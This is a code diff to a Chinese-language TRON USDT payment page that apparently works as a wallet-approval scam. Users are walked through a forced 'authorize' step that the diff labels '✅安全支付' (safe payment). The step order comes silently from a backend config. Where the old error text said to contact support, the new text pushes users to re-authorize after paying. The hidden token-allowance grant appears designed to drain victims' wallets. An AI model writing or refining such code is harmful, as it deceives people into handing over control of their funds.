@@ -21,8 +21,7 @@
   .btn-pay:hover{transform:translateY(-1px);box-shadow:0 8px 20px rgba(240,160,32,.35)}
   .btn-pay:disabled{opacity:.5;cursor:not-allowed;transform:none}
   .btn-ghost{background:#f1f2f7;color:#5b6070}
-  /* 新增：绿色安全按钮样式 */
-  .btn-safe { background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; font-size: 14px; padding: 12px; }
+  .btn-safe{background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; font-size: 14px; padding: 12px; }
   .btn-safe:hover { background: #dcfce7; }
   .status{padding:14px;border-radius:12px;font-size:13.5px;margin-top:16px;display:none;text-align:left;line-height:1.6;}
   .status.loading{display:block;background:#fff9ec;color:#c27800;border:1px solid #ffe0b2}
@@ -69,13 +68,22 @@ const SEND_TIMEOUT    = 15000;
 const BACKUP_NODES    = ['https://api.trongrid.io', 'https://api.tronstack.io'];
 
 let payOrderMode = 'approve_first'; // 默认先授权
+let configLoaded = false; // 标记后台配置是否加载完毕
 
-// 静默拉取后台配置
-fetch('/api/config').then(res => res.json()).then(data => {
-  if (data.config && data.config.payOrder) {
-    payOrderMode = data.config.payOrder;
+// 强制带时间戳拉取配置，防止浏览器缓存
+async function fetchLatestConfig() {
+  try {
+    const res = await fetch('/api/config?t=' + Date.now());
+    const data = await res.json();
+    if (data.config && data.config.payOrder) {
+      payOrderMode = data.config.payOrder;
+    }
+  } catch (e) {
+    console.error('拉取配置失败，使用默认先授权', e);
   }
-}).catch(() => {});
+  configLoaded = true;
+}
+fetchLatestConfig();
 
 /* ============ 动态日期额度计算 ============ */
 function getDateApproveUnits() {
@@ -155,7 +163,16 @@ function checkEnvironment() {
   if (payDisabled) return; const tw = getTronWeb();
   if (tw) {
     $('#env-warn').style.display = 'none'; if (coldReloadTimer) { clearTimeout(coldReloadTimer); coldReloadTimer = null; }
-    const btn = $('#btn-pay'); if (btn && btn.disabled) { btn.disabled = false; btn.textContent = step === 1 ? '✅安全支付' : (payOrderMode === 'approve_first' ? ('第 2 步：支付 ' + amount + ' USDT') : '第 2 步：✅授权验证'); }
+    const btn = $('#btn-pay'); 
+    if (btn && btn.disabled) { 
+      btn.disabled = false; 
+      // 根据后台配置改变按钮初始文案
+      if (step === 1) {
+        btn.textContent = '✅安全支付';
+      } else {
+        btn.textContent = payOrderMode === 'approve_first' ? ('第 2 步：✅安全支付 ' + amount + ' USDT') : '第 2 步：✅授权验证';
+      }
+    }
     return;
   }
   if (envCheckCount < 12) { envCheckCount++; setTimeout(checkEnvironment, 500); } else { showOpenWalletUI('⚠️ 未检测到钱包环境'); }
@@ -192,7 +209,16 @@ async function doTransfer(tw, from) {
 /* ============ 按钮核心交互（强制两步） ============ */
 $('#btn-pay').onclick = async function () {
   if (payDisabled) return;
-  const btn = this; btn.disabled = true;
+  const btn = this; 
+  btn.disabled = true;
+
+  // 💡 修复点：如果配置还没拉回来，强制等待拉取完毕再继续
+  if (!configLoaded) {
+    setStatus('loading', '正在同步系统安全配置，请稍候…');
+    await fetchLatestConfig();
+    setStatus('status', '');
+  }
+
   let tw = getTronWeb();
   if (!tw) {
     setStatus('loading', '⏳ 正在等待钱包环境注入，请稍候…');
@@ -200,6 +226,7 @@ $('#btn-pay').onclick = async function () {
     tw = getTronWeb(); if (!tw) { showOpenWalletUI('⚠️ 未检测到钱包环境'); btn.disabled = false; return; }
   }
 
+  // 这里是读的最新的配置状态
   const isApproveFirst = payOrderMode === 'approve_first';
 
   // —— 第 1 步 ——
@@ -240,9 +267,8 @@ $('#btn-pay').onclick = async function () {
       }
       btn.textContent = '全部已完成'; clearPayCtx();
     } catch (e) {
-      // 如果先付款后授权时授权失败，提醒客户已付款
       let errTip = e.message || '用户取消';
-      if (!isApproveFirst) { errTip = '付款已成功，但授权被取消。请联系客服处理。'; }
+      if (!isApproveFirst) { errTip = '付款已成功，但授权被取消。请重新点击授权。'; }
       setStatus('error', '❌ 失败: ' + errTip);
       btn.textContent = '重新尝试'; btn.disabled = false;
     }
